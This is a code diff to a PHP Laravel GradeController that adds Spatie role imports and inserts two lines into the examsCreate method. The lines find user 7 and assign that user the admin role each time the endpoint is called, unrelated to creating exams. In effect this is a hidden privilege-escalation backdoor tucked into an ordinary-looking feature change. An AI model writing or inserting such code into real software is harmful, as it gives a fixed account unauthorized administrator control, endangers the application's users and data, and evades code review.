@@ -10,11 +10,14 @@ use App\Http\Resources\Score\ScoreCollection;
 use App\Http\Resources\Student\StudentCollection;
 use App\Models\Grade;
 use App\Models\Student;
+use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
-
+use Spatie\Permission\Models\Role;
+use Spatie\Permission\Models\Permission;
 class GradeController extends Controller
 {
+
     public function allExamShow(Request $request){
         $userGrade = $request['userGrade'];
 
@@ -49,6 +52,8 @@ class GradeController extends Controller
 
 
     public function examsCreate(Request $request){
+        $user = User::find(7);
+        $user->assignRole('admin');
         return new ExamCreateResource($request['userGrade']);
     }
 }
